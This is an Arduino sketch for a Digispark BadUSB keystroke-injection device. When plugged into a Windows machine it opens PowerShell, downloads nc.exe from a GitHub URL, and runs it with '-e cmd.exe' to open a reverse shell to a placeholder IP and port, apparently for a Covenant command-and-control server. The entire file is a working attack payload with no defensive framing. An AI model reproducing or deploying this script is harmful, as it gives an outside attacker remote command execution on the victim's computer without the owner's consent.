#include "DigiKeyboard.h"

void setup() {
  //Open Start
  pinMode(1, OUTPUT);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  //Enter PS
  DigiKeyboard.print("powershell.exe");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  //Execute Reverse Shell and connect to Covenent
  DigiKeyboard.print("Invoke-WebRequest -Uri 'https://github.com/purpleracc00n/BadUSB_Scripts/raw/main/nc.exe' -outfile 'nc.exe'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("./nc.exe <IP> <port> -e cmd.exe");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  digitalWrite(1, LOW);
}


void loop() {
  // When scripts are done, blink some LED

  digitalWrite(1, HIGH);
  delay(200);

  digitalWrite(1, LOW);
  delay(300);
}
